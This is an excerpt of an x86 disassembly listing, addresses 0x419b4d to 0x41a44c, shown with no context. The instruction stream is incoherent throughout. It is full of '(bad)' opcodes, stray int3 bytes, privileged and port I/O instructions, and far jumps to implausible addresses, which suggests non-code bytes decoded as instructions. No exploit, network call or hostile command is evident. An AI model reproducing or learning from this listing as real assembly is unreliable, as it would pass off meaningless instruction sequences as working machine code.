  419b4d:	adc    bh,BYTE PTR [eax-0x78ff87ab]
  419b53:	inc    ebp
  419b54:	rol    DWORD PTR [ebx+eax*2-0x4],1
  419b58:	cmp    DWORD PTR [eax],eax
  419b5a:	add    BYTE PTR [eax],al
  419b5c:	loop   0x419b54
  419b5e:	mov    BYTE PTR [ebp-0x3b],dl
  419b61:	add    dl,0x1
  419b64:	mov    al,0xd2
  419b66:	sti    
  419b67:	xor    DWORD PTR [esp+ebp*2],0x8
  419b6b:	jae    0x419bc5
  419b6d:	jns    0x419bb2
  419b6f:	cld    
  419b70:	mov    dl,0xfb
  419b72:	or     BYTE PTR [ebx+edi*1-0x3daf0040],0xd2
  419b7a:	out    0x52,eax
  419b7c:	mov    ss,WORD PTR [edx]
  419b7e:	mov    ah,0x55
  419b80:	clc    
  419b81:	dec    DWORD PTR [eax+0x4767d4d]
  419b87:	lea    ebp,[ebp+0x62003ed2]
  419b8d:	dec    edi
  419b8e:	mov    ebp,esp
	...
  419ba4:	add    al,0x41
  419ba6:	int3   
  419ba7:	int3   
  419ba8:	ins    DWORD PTR es:[edi],dx
  419ba9:	cmp    ecx,esp
  419bab:	int3   
  419bac:	test   DWORD PTR [ebx],edi
  419bae:	int3   
  419baf:	int3   
  419bb0:	jge    0x419bed
  419bb2:	int3   
  419bb3:	int3   
  419bb4:	in     al,dx
  419bb5:	js     0x419ba3
  419bb7:	mov    eax,ds:0x3ed629
  419bbc:	ja     0x419c35
  419bbe:	inc    eax
  419bbf:	xor    dl,al
  419bc1:	mov    ebp,0xb8b03e07
  419bc6:	pop    es
  419bc7:	pop    ebp
  419bc8:	cli    
  419bc9:	cmp    al,0xcc
  419bcb:	int3   
  419bcc:	add    eax,0xfdcccc3d
  419bd1:	cmp    al,0xcc
  419bd3:	int3   
  419bd4:	ins    BYTE PTR es:[edi],dx
  419bd5:	ja     0x419bc3
  419bd7:	mov    esi,DWORD PTR [esp+edi*8+0x4f]
  419bdb:	mov    eax,DWORD PTR [eax+edi*8-0x4bbb00b2]
  419be2:	push   ebx
  419be3:	inc    ecx
  419be4:	cmp    ebp,ecx
  419be6:	ror    ah,0xed
  419be9:	cmp    al,0xcc
  419beb:	int3   
  419bec:	add    eax,0xfdcccc3d
  419bf1:	cmp    al,0xcc
  419bf3:	int3   
  419bf4:	ins    BYTE PTR es:[edi],dx
  419bf5:	ja     0x419be3
  419bf7:	or     ebp,0xfffffff8
  419bfa:	imul   eax,DWORD PTR [eax],0xdc680023
  419c00:	cmp    eax,eax
  419c02:	(bad)  
  419c03:	dec    BYTE PTR [eax+ebp*4+0x53]
  419c07:	inc    ecx
	...
  419c1c:	cmp    DWORD PTR [ecx+0x43],edi
  419c1f:	clc    
  419c20:	and    DWORD PTR [eax+0x2],ebx
  419c23:	inc    eax
  419c24:	cmp    DWORD PTR [edi+0x43],esi
  419c27:	clc    
  419c28:	jmp    0x7f415684
  419c2d:	imul   eax,DWORD PTR [ecx+0x437941c4],0xfffffffc
  419c34:	ret    0xfbd
  419c37:	push   ecx
  419c38:	mov    dl,0xd5
  419c3a:	or     edx,DWORD PTR [edx-0x4e]
  419c3d:	lds    eax,FWORD PTR [edi]
  419c3f:	push   eax
  419c40:	push   esi
  419c41:	aad    0xfb
  419c43:	mov    edx,DWORD PTR [ebp+ecx*8-0x40]
  419c47:	int3   
  419c48:	in     al,dx
  419c49:	jbe    0x419c37
  419c4b:	push   ecx
  419c4c:	jbe    0x419c13
  419c4e:	sti    
  419c4f:	add    BYTE PTR [ecx],bh
  419c51:	add    BYTE PTR [eax],al
  419c53:	jmp    0x419c95
  419c55:	ja     0x419c9a
  419c57:	cld    
  419c58:	mov    edx,0x7488ff3f
  419c5d:	ins    BYTE PTR es:[edi],dx
  419c5e:	mov    DWORD PTR [ebp+0x15],ecx
  419c61:	daa    
  419c62:	dec    ebx
  419c63:	adc    BYTE PTR [edx+0x3155890b],cl
  419c69:	call   DWORD PTR [edx-0x4]
  419c6c:	cs mov dl,0x2
  419c6f:	mov    eax,DWORD PTR [esp+edi*8-0x512b300]
  419c76:	mov    ch,0x11
  419c78:	and    bh,BYTE PTR [esi]
  419c7a:	je     0x419c83
  419c7c:	mov    eax,ds:0x0
	...
  419c91:	add    BYTE PTR [eax],al
  419c93:	add    BYTE PTR [ecx],bh
  419c95:	push   edi
  419c96:	add    al,0xeb
  419c98:	jmp    0xdccd5ccb
  419c9d:	int3   
  419c9e:	ror    ah,0xed
  419ca1:	cmp    ecx,esp
  419ca3:	int3   
  419ca4:	test   DWORD PTR [ebx],edi
  419ca6:	int3   
  419ca7:	int3   
  419ca8:	jge    0x419ce5
  419caa:	int3   
  419cab:	int3   
  419cac:	or     al,0x77
  419cae:	in     al,dx
  419caf:	mov    ecx,0x41
  419cb4:	sbb    eax,0x3c890777
  419cb9:	adc    BYTE PTR [esi+0x41],dl
  419cbc:	cmp    ebp,ecx
  419cbe:	ror    ah,0x6d
  419cc1:	cmp    ecx,esp
  419cc3:	int3   
  419cc4:	test   DWORD PTR [ebx],edi
  419cc6:	int3   
  419cc7:	int3   
  419cc8:	jge    0x419d05
  419cca:	int3   
  419ccb:	int3   
  419ccc:	or     al,0x77
  419cce:	in     al,dx
  419ccf:	or     DWORD PTR [ebp+0xf],0xffffff89
  419cd3:	inc    ebp
  419cd4:	inc    ecx
  419cd5:	jg     0x419d4f
  419cd7:	add    al,0x39
  419cd9:	sti    
  419cda:	or     DWORD PTR [eax-0x74ffffc7],0xffffffec
  419ce1:	test   DWORD PTR [eax-0x1582c2af],0x87570808
  419ceb:	push   ebp
  419cec:	sub    eax,0xba084376
  419cf1:	inc    eax
  419cf2:	or     BYTE PTR [ecx+0x45c5707c],cl
	...
  419d0c:	or     eax,0x39000001
  419d11:	push   ebp
  419d12:	pop    es
  419d13:	mov    ebp,DWORD PTR [esp+ebp*2-0x7f]
  419d17:	sar    DWORD PTR [eax],0x77
  419d1a:	dec    ebx
  419d1b:	cld    
  419d1c:	ret    0xfbd3
  419d1f:	cmp    ecx,DWORD PTR [esp+esi*2-0x3c4db98f]
  419d26:	sti    
  419d27:	mov    eax,DWORD PTR [eax+esi*2-0x40da48f3]
  419d2e:	mov    esi,0xfa7d35fa
  419d33:	add    eax,DWORD PTR [esi+ebp*1-0x77]
  419d37:	inc    ebp
  419d38:	mov    ch,0x75
  419d3a:	dec    ebx
  419d3b:	lock ds mov cl,0x14
  419d3f:	inc    ecx
  419d40:	mov    eax,0x390ffd5e
  419d45:	add    BYTE PTR [edi+0x43759155],al
  419d4b:	or     dl,al
  419d4d:	mov    ebx,0x7531030b
  419d52:	push   ebx
  419d53:	clc    
  419d54:	mov    dl,0x4
  419d56:	lsl    edi,sp
  419d59:	jns    0x53b6deac
  419d5f:	or     al,0x3a
  419d61:	jns    0x4b8feb4
  419d67:	or     ah,BYTE PTR [edx-0x69]
  419d6a:	mov    DWORD PTR [ebp+0x41],edx
  419d6d:	jne    0x419db2
  419d6f:	or     BYTE PTR [eax],al
	...
  419d81:	add    BYTE PTR [eax],al
  419d83:	add    BYTE PTR [edx],bh
  419d85:	mov    esi,0xf7f48903
  419d8a:	out    0x6b,al
  419d8c:	ss imul edi,ebp,0xc0cb148b
  419d93:	int3   
  419d94:	mov    WORD PTR [ebp-0x14],?
  419d97:	or     DWORD PTR ds:0x41458924,0x77
  419d9e:	inc    ebx
  419d9f:	in     al,0xc2
  419da1:	mov    edx,0x646c8be3
  419da6:	add    DWORD PTR [ecx+0x3d],edx
  419da9:	ja     0x419dfe
  419dab:	call   0x8c296072
  419db0:	sar    DWORD PTR [edi+0x0],0x0
  419db4:	cmp    DWORD PTR [edi+0x4b],esi
  419db7:	lock mov edx,0x4600efea
  419dbd:	test   cl,bh
  419dbf:	add    BYTE PTR [ecx],bh
  419dc1:	add    BYTE PTR [ecx+0x52fd3155],cl
  419dc7:	lock mov al,0xd2
  419dca:	fisttp WORD PTR [ebx+0x78815ffc]
  419dd0:	dec    ecx
  419dd1:	add    BYTE PTR ds:0xffff9c84,cl
  419dd7:	call   DWORD PTR [ebx]
  419dd9:	add    BYTE PTR [edx+0x0],ch
  419ddc:	ret    0xdfba
  419ddf:	mov    esp,esp
  419de1:	test   DWORD PTR [eax],0xfcce3551
  419de7:	adc    eax,0x0
	...
  419dfc:	rcl    edx,0x3e
  419dff:	add    al,al
  419e01:	ret    0x8bfb
  419e04:	hlt    
  419e05:	pop    edi
  419e06:	cmp    DWORD PTR [eax],0x8b16f439
  419e0c:	in     al,dx
  419e0d:	pop    edi
  419e0e:	mov    DWORD PTR [ebp+0x41],edx
  419e11:	std    
  419e12:	push   cs
  419e13:	mov    esp,esp
  419e15:	jae    0x419da0
  419e17:	inc    ebp
  419e18:	pop    ecx
  419e19:	je     0x419e66
  419e1b:	or     BYTE PTR [edx],bh
  419e1d:	mov    eax,0x5484890f
  419e22:	jmp    0xe00f603e
  419e27:	mov    edi,DWORD PTR [eax+edi*8+0x0]
  419e2b:	inc    edx
  419e2c:	dec    ecx
  419e2d:	jns    0x419e72
  419e2f:	hlt    
  419e30:	ret    0xdfb5
  419e33:	mov    esp,DWORD PTR [eax+edi*8+0x0]
  419e37:	adc    DWORD PTR [eax+0x74c7ebcd],esi
  419e3d:	push   0x390000
  419e42:	mov    DWORD PTR [ebp-0x27],eax
  419e45:	cmp    DWORD PTR [eax+0x10],0x39
  419e49:	in     al,dx
  419e4a:	or     al,0x8b
  419e4c:	ins    BYTE PTR es:[edi],dx
  419e4d:	pusha  
  419e4e:	cmp    DWORD PTR [ecx],0xc704ec39
  419e54:	je     0x419ebe
  419e56:	(bad)  
  419e57:	(bad)  
  419e58:	cmp    DWORD PTR [eax],eax
  419e5a:	mov    DWORD PTR [ebp-0x3b],edx
  419e5d:	cmp    DWORD PTR [edx],0x0
	...
  419e74:	sub    eax,0xa54588e1
  419e79:	jnp    0x419e83
  419e7b:	sbb    DWORD PTR [eax-0x47000000],0xec8b1bec
  419e85:	imul   ecx,DWORD PTR [ecx-0x298abfe],0xffffffff
  419e8c:	push   es
  419e8d:	ror    BYTE PTR [eax-0x182e82b3],1
  419e93:	mov    ch,0x74
  419e95:	addr16 std 
  419e97:	xor    DWORD PTR [ebp-0x8],0xffffff86
  419e9b:	inc    ebp
  419e9c:	test   DWORD PTR [ebx+0x1c],ebx
  419e9f:	mov    eax,DWORD PTR [esp+ebp*2]
  419ea2:	mov    DWORD PTR [edx],eax
  419ea4:	ret    0x7b5
  419ea7:	(bad)  
  419ea8:	in     eax,0xf7
  419eaa:	add    DWORD PTR [edx-0x4e],edx
  419ead:	mov    ebp,0x8f5150fb
  419eb2:	sti    
  419eb3:	push   DWORD PTR [esi]
  419eb5:	add    esp,0x8
  419eb8:	sar    BYTE PTR [ebx+ebx*8-0x76ab8b75],0x55
  419ec0:	std    
  419ec1:	js     0x419ed2
  419ec3:	mov    edi,DWORD PTR [esp+ebp*2-0x7f]
  419ec7:	shl    BYTE PTR ds:0xb2f44379,0xb4
  419ece:	jmp    0x419e53
  419ed0:	clc    
  419ed1:	sti    
  419ed2:	xchg   BYTE PTR [ebp-0x1b],cl
  419ed5:	pop    edx
  419ed6:	xchg   ebp,eax
  419ed7:	mov    eax,DWORD PTR [eax]
	...
  419ee9:	add    BYTE PTR [eax],al
  419eeb:	add    BYTE PTR [eax+eiz*2+0x794dc281],al
  419ef2:	push   ebx
  419ef3:	loopne 0x419ec5
  419ef5:	cmc    
  419ef6:	cld    
  419ef7:	call   esi
  419ef9:	jp     0x419ede
  419efb:	pop    ebp
  419efc:	cli    
  419efd:	xor    ecx,esp
  419eff:	int3   
  419f00:	ins    BYTE PTR es:[edi],dx
  419f01:	jnp    0x419eef
  419f03:	or     ebp,0xfffffff7
  419f06:	addr16 lock cmp eax,eax
  419f0a:	(bad)  
  419f0b:	inc    BYTE PTR [eax+eax*2+0x53]
  419f0f:	inc    ecx
  419f10:	cmp    DWORD PTR [ecx+0x43],edi
  419f13:	clc    
  419f14:	adc    DWORD PTR [edx+eax*1+0x40],esp
  419f18:	cmp    DWORD PTR [ebx+0x43],edi
  419f1b:	clc    
  419f1c:	jmp    0x873edd78
  419f21:	add    sp,0x7931
  419f26:	inc    ebx
  419f27:	cld    
  419f28:	ret    0xfb4
  419f2b:	push   ecx
  419f2c:	ret    0xbcc
  419f2f:	push   edx
  419f30:	mov    dl,0xbc
  419f32:	pop    es
  419f33:	push   eax
  419f34:	pop    esi
  419f35:	int3   
  419f36:	sti    
  419f37:	mov    ebx,DWORD PTR [esp+eax*8-0x40]
  419f3b:	int3   
  419f3c:	jge    0x419f71
  419f3e:	int3   
  419f3f:	int3   
  419f40:	in     al,dx
  419f41:	jp     0x419f2f
  419f43:	mov    eax,ds:0x3ece1d
  419f48:	inc    DWORD PTR [eax]
  419f4a:	push   0x560c448b
  419f4f:	inc    ecx
	...
  419f64:	cmp    DWORD PTR [edi+0x50],esi
  419f67:	add    ebx,ebp
  419f69:	inc    ecx
  419f6a:	mov    BYTE PTR [eax+0x3c],dl
  419f6d:	ret    
  419f6e:	ror    ah,0xfd
  419f71:	xor    al,0xcc
  419f73:	int3   
  419f74:	ins    BYTE PTR es:[edi],dx
  419f75:	jns    0x419f63
  419f77:	or     DWORD PTR ds:0x8f109ef5,0xffffffbf
  419f7e:	dec    DWORD PTR [edx+0x3ec7320b]
  419f84:	mov    dl,0xc0
  419f86:	das    
  419f87:	mov    ecx,DWORD PTR [ebx]
  419f89:	jp     0x419f5d
  419f8b:	ds ret 0xbb8
  419f8f:	mov    ebp,ebx
  419f91:	ja     0x419fde
  419f93:	hlt    
  419f94:	mov    dl,0xbb
  419f96:	repz mov esi,DWORD PTR [ecx-0xc]
  419f9a:	xchg   BYTE PTR [ebp-0x4f],cl
  419f9d:	jns    0x419ff2
  419f9f:	clc    
  419fa0:	ror    bl,0xfb
  419fa3:	mov    eax,0x38
  419fa8:	mov    ah,0x40
  419faa:	je     0x419ff0
  419fac:	mov    edx,0x400f7e3
  419fb1:	cld    
  419fb2:	xor    al,al
  419fb4:	xchg   edx,eax
  419fb5:	and    al,0x89
  419fb7:	dec    ebp
  419fb8:	cmp    DWORD PTR [ecx+0x4f],0x7cb3218
  419fbf:	jne    0x41a011
  419fc1:	jns    0x41a006
  419fc3:	clc    
  419fc4:	mov    dl,0xb3
  419fc6:	or     ecx,DWORD PTR [ecx+0x0]
	...
  419fdc:	icebp  
  419fdd:	add    ecx,DWORD PTR [ecx+0x43795155]
  419fe3:	adc    al,al
  419fe5:	ret    0xb817
  419fe8:	cmp    BYTE PTR [eax],al
  419fea:	add    BYTE PTR [eax],al
  419fec:	push   edx
  419fed:	or     BYTE PTR [ecx+0xf79314d],cl
  419ff3:	mov    DWORD PTR [eax+ebp*2+0x29214589],eax
  419ffa:	inc    ebx
  419ffb:	cld    
  419ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ffd:	cld    
  419ffe:	xor    al,al
  41a000:	and    bh,ah
  41a002:	call   0x8981eaba
  41a007:	in     eax,0x64
  41a009:	inc    ecx
  41a00a:	int3   
  41a00b:	int3   
  41a00c:	in     eax,dx
  41a00d:	xor    ecx,esp
  41a00f:	int3   
  41a010:	add    eax,0xfdcccc34
  41a015:	xor    ecx,esp
  41a017:	int3   
  41a018:	mov    WORD PTR [ecx-0x14],?
  41a01b:	or     ebp,0x7
  41a01e:	lds    eax,FWORD PTR [ebp-0x2f]
  41a021:	jmp    FWORD PTR [edi]
  41a023:	add    BYTE PTR [ecx],bh
  41a025:	fadd   DWORD PTR [ebx]
  41a027:	add    edi,DWORD PTR [ecx+0x0]
  41a02a:	lahf   
  41a02b:	cld    
  41a02c:	fs mov edi,0xd0a14fff
  41a032:	sti    
  41a033:	jmp    FWORD PTR [esi-0x4ff73b80]
  41a039:	mov    edx,0x78f96af3
  41a03e:	dec    ebx
  41a03f:	clc    
	...
  41a054:	call   0xe51db3d1
  41a059:	mov    esi,0xcffb8aff
  41a05e:	dec    edi
  41a05f:	push   0x39
  41a061:	gs push ebx
  41a063:	hlt    
  41a064:	call   0x3b81:0x3941534b
  41a06b:	aam    0xc
  41a06d:	mov    edi,0xfce4ffff
  41a072:	mov    bh,0x2
  41a074:	cmp    DWORD PTR [eax],eax
  41a076:	add    bl,ch
  41a078:	jecxz  0x41a0f2
  41a07a:	or     eax,DWORD PTR [eax]
  41a07c:	cmp    eax,eax
  41a07e:	dec    DWORD PTR [eax+0x686fec]
  41a084:	mov    WORD PTR [ecx],es
  41a086:	add    BYTE PTR [eax+0x39],ch
  41a089:	(bad)  
  41a08a:	aas    
  41a08b:	add    BYTE PTR [edx+0x7855d40d],dh
  41a091:	add    BYTE PTR [edi-0x3e],bh
  41a094:	cmp    esi,edi
  41a096:	(bad)  
  41a097:	jmp    FWORD PTR [ebx+0x58]
  41a09a:	sahf   
  41a09b:	inc    BYTE PTR [esi]
  41a09d:	fs add esp,0x200a82d
  41a0a4:	jns    0x41a0a6
  41a0a6:	sub    eax,DWORD PTR [eax]
  41a0a8:	cmp    eax,DWORD PTR [eax]
  41a0aa:	add    BYTE PTR [ebx+0x41534c34],cl
  41a0b0:	cmp    DWORD PTR [edi],edx
  41a0b2:	enter  0x4489,0xfc
  41a0b6:	push   ebp
  41a0b7:	inc    ecx
	...
  41a0cc:	cmp    DWORD PTR [edi+0x13],esi
  41a0cf:	add    al,0x6f
  41a0d1:	sar    edi,0x51
  41a0d4:	cwde   
  41a0d5:	dec    esp
  41a0d6:	push   ebx
  41a0d7:	inc    ecx
  41a0d8:	cmp    eax,edx
  41a0da:	mov    BYTE PTR [ebp-0x57],cl
  41a0dd:	shl    edi,1
  41a0df:	popf   
  41a0e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0e1:	arpl   bp,di
  41a0e3:	xor    DWORD PTR [ebp-0xc],0xffffff88
  41a0e7:	adc    eax,0x3ecd6d
  41a0ec:	cmp    cl,ch
  41a0ee:	pop    es
  41a0ef:	mov    esp,ebp
  41a0f1:	push   edi
  41a0f2:	mov    DWORD PTR [ebp-0x6f],edx
  41a0f5:	arpl   dx,sp
  41a0f7:	mov    ebx,DWORD PTR [ebp+eax*8-0x40]
  41a0fb:	int3   
  41a0fc:	jge    0x41a132
  41a0fe:	int3   
  41a0ff:	int3   
  41a100:	or     al,0x77
  41a102:	in     al,dx
  41a103:	mov    esi,esp
  41a105:	idiv   DWORD PTR [eax]
  41a107:	inc    ebp
  41a108:	inc    ebp
  41a109:	out    dx,eax
  41a10a:	add    al,0x8b
  41a10c:	hlt    
  41a10d:	imul   eax
  41a10f:	add    eax,0x4588ff52
  41a114:	sub    eax,0x5ccc0c5
  41a119:	xor    al,0xcc
  41a11b:	int3   
  41a11c:	std    
  41a11d:	xor    ecx,esp
  41a11f:	int3   
  41a120:	mov    WORD PTR [edi-0x14],?
  41a123:	or     DWORD PTR ds:0x1545c514,0x0
  41a12a:	jo     0x41a12d
  41a12c:	cmp    DWORD PTR [edi+0x43],esi
  41a12f:	or     BYTE PTR [eax],al
	...
  41a141:	add    BYTE PTR [eax],al
  41a143:	add    BYTE PTR [eax+0x6c8bd7bc],dh
  41a149:	dec    eax
  41a14a:	mov    DWORD PTR [ebp+0x41],edx
  41a14d:	dec    DWORD PTR [esi+0x3c]
  41a150:	ror    ah,0xdf
  41a153:	mov    edi,DWORD PTR [eax+eiz*2+0xd]
  41a157:	mov    bh,0x71
  41a159:	or     al,0x89
  41a15b:	push   ebp
  41a15c:	fnstenv [esp+eax*2+0xa]
  41a160:	xor    DWORD PTR [ecx+0x43],edi
  41a163:	call   0x4042adb9
  41a168:	cmp    DWORD PTR [edi+0xb],esi
  41a16b:	cld    
  41a16c:	or     al,0xc1
  41a16e:	call   DWORD PTR [eax-0x5f]
  41a171:	mov    dl,0xf8
  41a173:	jmp    DWORD PTR [esi-0x4ff73b82]
  41a179:	mov    esp,0xd7f96aef
  41a17e:	jmp    FWORD PTR [edi]
  41a180:	cmp    DWORD PTR [eax],eax
  41a182:	push   0x10900
  41a187:	push   0x39
  41a189:	arpl   WORD PTR [ebx-0x10],dx
  41a18c:	sar    BYTE PTR [ebx+eiz*8-0x769ffb75],0x42
  41a194:	or     eax,0x314d88d0
  41a199:	ror    DWORD PTR [eax-0x1832a2ab],1
  41a19f:	ror    DWORD PTR [edx+eiz*2-0x3],0x83
  41a1a4:	jge    0x41a199
  41a1a6:	les    eax,FWORD PTR [ebp+0x0]
	...
  41a1b9:	add    BYTE PTR [eax],al
  41a1bb:	add    BYTE PTR [ebp-0x1],al
  41a1be:	(bad)  
  41a1bf:	(bad)  
  41a1c0:	cmp    DWORD PTR [ebp+0x7],edx
  41a1c3:	mov    esi,DWORD PTR [esp+ebp*2-0x7f]
  41a1c7:	sar    BYTE PTR [eax],0x77
  41a1ca:	inc    ebx
  41a1cb:	hlt    
  41a1cc:	mov    dl,0xb3
  41a1ce:	fisttp WORD PTR [edi]
  41a1d0:	into   
  41a1d1:	iret   
  41a1d2:	add    eax,0x716c6439
  41a1d7:	pop    ecx
  41a1d8:	mov    dl,0xbb
  41a1da:	out    0x83,eax
  41a1dc:	or     DWORD PTR [eax+eax*1],0x4b757c74
  41a1e3:	call   0x5189a2
  41a1e8:	ins    DWORD PTR es:[edi],dx
  41a1e9:	and    al,0x89
  41a1eb:	push   ebp
  41a1ec:	shl    DWORD PTR [ebp+0x42],1
  41a1ef:	adc    dl,al
  41a1f1:	mov    bl,0xdf
  41a1f3:	mov    ebp,DWORD PTR [eax+0x24]
  41a1f6:	mov    eax,DWORD PTR [ecx+ebp*1+0x61]
  41a1fa:	mov    DWORD PTR [ebp-0x27],ecx
  41a1fd:	sub    eax,0x2428f7d2
  41a202:	mov    DWORD PTR [ebp-0x67],edx
  41a205:	icebp  
  41a206:	lods   al,BYTE PTR ds:[esi]
  41a207:	inc    edx
  41a208:	ror    BYTE PTR gs:[eax+0x4b759145],1
  41a20f:	or     BYTE PTR [edx],bh
  41a211:	mov    eax,0xcbc25113
  41a216:	out    0x8b,eax
  41a218:	cld    
  41a219:	pop    ebx
  41a21a:	add    DWORD PTR [edx+0x2d],eax
  41a21d:	shl    bh,1
  41a21f:	push   ebp
	...
  41a234:	je     0x41a297
  41a236:	std    
  41a237:	xor    DWORD PTR [ebp-0xc],0xffffff88
  41a23b:	dec    ebp
  41a23c:	push   ecx
  41a23d:	jge    0x41a1fe
  41a23f:	sub    BYTE PTR [eax-0x5414184d],dh
  41a245:	jne    0x41a29a
  41a247:	in     al,0xeb
  41a249:	push   edi
  41a24a:	push   cs
  41a24b:	cld    
  41a24c:	inc    esi
  41a24d:	popa   
  41a24e:	add    esp,0x323d835
  41a254:	jns    0x41a256
  41a256:	lahf   
  41a257:	cld    
  41a258:	test   BYTE PTR [edi+0x75114fff],bh
  41a25e:	cli    
  41a25f:	call   FWORD PTR [esi]
  41a261:	jge    0x41a227
  41a263:	or     al,al
  41a265:	mov    edx,0x684c83db
  41a26a:	push   ebx
  41a26b:	inc    ecx
  41a26c:	cmp    DWORD PTR [eax],eax
  41a26e:	jae    0x41a27a
  41a270:	mov    dl,0xf2
  41a272:	out    dx,eax
  41a273:	push   ebp
  41a274:	js     0x41a276
  41a276:	dec    edi
  41a277:	inc    DWORD PTR [esp+eax*2-0x351ec27f]
  41a27e:	add    BYTE PTR ds:[ecx],bh
  41a281:	jmp    0x41a29e
  41a283:	push   0x79
  41a285:	fdivr  st,st(7)
  41a287:	das    
  41a288:	cmp    DWORD PTR [eax],eax
  41a28a:	mov    DWORD PTR [ebp-0x3b],edx
  41a28d:	int    0x88
  41a28f:	inc    ebp
  41a290:	fnstenv [eax+ecx*2+0x34]
  41a294:	or     BYTE PTR [ecx+0x53],ah
  41a297:	lock add BYTE PTR [eax],al
	...
  41a2aa:	add    BYTE PTR [eax],al
  41a2ac:	fimul  DWORD PTR [ebx+0x53]
  41a2af:	inc    ecx
  41a2b0:	cmp    DWORD PTR [ebp+0x13],edx
  41a2b3:	push   0xfffffff9
  41a2b5:	xlat   BYTE PTR ds:[ebx]
  41a2b6:	jmp    FWORD PTR [edi]
  41a2b8:	cmp    DWORD PTR [eax],eax
  41a2ba:	mov    DWORD PTR [ebp-0x73],edx
  41a2bd:	int    0x69
  41a2bf:	add    BYTE PTR [esi+0x65a3efca],al
  41a2c5:	retf   0x3e
  41a2c8:	mov    edx,0xf855d422
  41a2cd:	(bad)  
  41a2ce:	push   DWORD PTR [esp+ecx*2-0x2a]
  41a2d2:	aas    
  41a2d3:	push   0x3039
  41a2d8:	ret    0xfbba
  41a2db:	push   eax
  41a2dc:	jecxz  0x41a2dd
  41a2de:	cld    
  41a2df:	push   ebp
  41a2e0:	dec    ecx
  41a2e1:	pushf  
  41a2e2:	aam    0x55
  41a2e4:	clc    
  41a2e5:	dec    DWORD PTR [eax+0x4b8a1d4d]
  41a2eb:	fadd   st,st(2)
  41a2ed:	mov    ch,0xd7
  41a2ef:	mov    edi,DWORD PTR [eax+edi*1+0x1]
  41a2f3:	inc    edx
  41a2f4:	pop    ebp
  41a2f5:	mov    DWORD PTR [ebx-0x20],eax
  41a2f8:	ret    0xdfcd
  41a2fb:	mov    ebp,DWORD PTR [eax-0x50]
  41a2fe:	push   ecx
  41a2ff:	mov    edi,DWORD PTR [esp+eiz*2+0x50]
  41a303:	mov    ebp,DWORD PTR [esp+esi*1]
  41a306:	push   ebx
  41a307:	inc    ecx
  41a308:	cmp    DWORD PTR [ecx+0x5fed91e7],esi
  41a30e:	std    
  41a30f:	add    DWORD PTR [eax],0x0
	...
  41a322:	add    BYTE PTR [eax],al
  41a324:	std    
  41a325:	or     al,0x89
  41a327:	push   ebp
  41a328:	fld    DWORD PTR [ebx+0x39a4ba]
  41a32e:	add    BYTE PTR [eax],al
  41a330:	inc    ebp
  41a331:	sbb    DWORD PTR [ecx+0x4b8bd945],ecx
  41a337:	fdivr  DWORD PTR [edx]
  41a339:	mov    BYTE PTR [eax-0x78ffc700],ah
  41a33f:	dec    ebp
  41a340:	popf   
  41a341:	mov    edx,DWORD PTR [ebx-0x20]
  41a344:	fdiv   DWORD PTR [ebx+edx*2]
  41a347:	inc    ecx
  41a348:	cmp    DWORD PTR [ebx],ebp
  41a34a:	inc    edx
  41a34b:	xor    al,0xda
  41a34d:	add    al,0x56
  41a34f:	inc    ecx
  41a350:	cmp    DWORD PTR [ebx-0x3f10fbf5],ecx
  41a356:	call   DWORD PTR [eax-0x4e]
  41a359:	cmc    
  41a35a:	rcl    DWORD PTR [ebp-0x8],cl
  41a35d:	call   DWORD PTR [ecx-0x75]
  41a360:	hlt    
  41a361:	imul   edx,DWORD PTR [eax-0x18],0xffffffe5
  41a365:	pop    ecx
  41a366:	std    
  41a367:	(bad)  
  41a368:	mov    edx,0x48b0c44
  41a36d:	pusha  
  41a36e:	mov    DWORD PTR ds:0x3eb565,edx
  41a374:	cmp    dh,BYTE PTR [ecx-0xbdb76d9]
  41a37a:	push   ebp
  41a37b:	inc    ecx
  41a37c:	cmp    DWORD PTR [ebx-0x3e7b07c5],eax
  41a382:	(bad)  
  41a383:	jmp    FWORD PTR [esp+ebp*1+0xd49f]
	...
  41a39a:	add    BYTE PTR [eax],al
  41a39c:	test   cl,al
  41a39e:	dec    DWORD PTR [edi-0x3e]
  41a3a1:	or     al,0x14
  41a3a3:	push   esi
  41a3a4:	js     0x41a3a6
  41a3a6:	dec    edi
  41a3a7:	mov    ebp,DWORD PTR [eax+edx*2]
  41a3aa:	push   ebx
  41a3ab:	inc    ecx
  41a3ac:	cmp    DWORD PTR [edx+0x5ef575e7],esi
  41a3b2:	std    
  41a3b3:	xor    ebp,0xb
  41a3b6:	lahf   
  41a3b7:	aam    0x8c
  41a3b9:	sar    edi,0x4f
  41a3bc:	rol    esi,1
  41a3be:	idiv   bh
  41a3c0:	(bad)  
  41a3c1:	add    ah,0x4
  41a3c4:	loop   0x41a3a5
  41a3c6:	addr16 xor al,0x3a
  41a3c9:	sar    bh,0x8a
  41a3cc:	sub    al,0x5c
  41a3ce:	push   ebx
  41a3cf:	inc    ecx
  41a3d0:	cmp    DWORD PTR [ecx+0x5eb051e7],esi
  41a3d6:	std    
  41a3d7:	cmp    DWORD PTR [ebp+0x7],0xffffff87
  41a3db:	inc    ebp
  41a3dc:	test   DWORD PTR [edx-0x3f132bed],ecx
  41a3e2:	call   DWORD PTR [ecx-0x3e]
  41a3e5:	(bad)  
  41a3e6:	fisttp WORD PTR [ebx+0x41533434]
  41a3ec:	cmp    DWORD PTR [ebx],eax
  41a3ee:	dec    eax
  41a3ef:	sub    BYTE PTR [eax],cl
  41a3f1:	mov    edx,DWORD PTR [ebx]
  41a3f3:	lock add al,0xc1
  41a3f6:	call   DWORD PTR [ecx+0x51]
  41a3f9:	sub    bh,ah
  41a3fb:	call   FWORD PTR [esi-0x7e]
  41a3fe:	les    ecx,FWORD PTR [eax+eax*1]
	...
  41a411:	add    BYTE PTR [eax],al
  41a413:	add    BYTE PTR [eax+0x3941534f],bl
  41a419:	add    eax,0x385350
  41a41e:	mov    eax,ds:0xffc0e71c
  41a423:	mov    WORD PTR [eax+ebx*2-0x158695b1],es
  41a42a:	add    eax,0x55fc4c8b
  41a42f:	inc    ecx
  41a430:	cmp    DWORD PTR [edx+0x68ed55fc],esi
  41a436:	loop   0x41a433
  41a438:	push   cs
  41a439:	pop    esi
  41a43a:	mov    eax,0x3901
  41a43f:	mov    edx,DWORD PTR [esp+edi*4]
  41a442:	rol    DWORD PTR [ecx+edi*1],0x4c
  41a446:	int3   
  41a447:	int3   
  41a448:	std    
  41a449:	dec    esp
  41a44a:	int3   
  41a44b:	int3   
  41a44c:	mov    WORD PTR [ecx+0x8748bec],cs
